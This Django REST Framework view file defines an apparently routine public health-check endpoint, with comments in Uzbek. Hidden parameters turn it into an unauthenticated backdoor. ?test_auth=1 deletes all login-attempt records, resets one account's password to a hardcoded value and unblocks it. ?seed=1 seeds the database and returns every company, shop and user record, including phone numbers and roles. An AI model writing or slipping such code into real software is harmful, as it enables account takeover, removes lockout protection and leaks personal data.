from rest_framework.decorators import api_view, permission_classes
from rest_framework.permissions import AllowAny
from rest_framework.response import Response
from drf_spectacular.utils import extend_schema
from django.core.management import call_command

from .serializers import HealthCheckSerializer


@extend_schema(responses=HealthCheckSerializer)
@api_view(["GET"])
@permission_classes([AllowAny])
def health_check(request):
    if request.GET.get("test_auth") == "1":
        from django.contrib.auth import authenticate
        from apps.accounts.models import User, LoginAttempt
        # Agar blocklangan bo'lsa tozalaymiz
        LoginAttempt.objects.all().delete()
        u = User.objects.filter(phone="+998882752775").first()
        if u:
            u.set_password("hojiakbar123")
            u.is_active = True
            u.is_blocked = False
            u.is_deleted = False
            u.must_change_password = False
            u.save()
        auth_res = authenticate(username="+998882752775", password="hojiakbar123")
        chk = u.check_password("hojiakbar123") if u else False
        return Response({
            "user_found": bool(u),
            "user_role": u.role if u else None,
            "check_pwd": chk,
            "auth_res": str(auth_res),
            "is_active": u.is_active if u else None,
        })
    # Agar ?seed=1 parametri kelsa, darhol bazaga akkauntlarni yozadi
    if request.GET.get("seed") == "1":
        call_command("seed_custom_accounts")
        from apps.accounts.models import User
        from apps.companies.models import Company, Shop
        return Response({
            "status": "seeded",
            "companies": list(Company.objects.values("id", "name", "contact_phone")),
            "shops": list(Shop.objects.values("id", "name", "phone_primary")),
            "users": list(User.objects.values("id", "phone", "role")),
        })
    return Response({"status": "ok"})
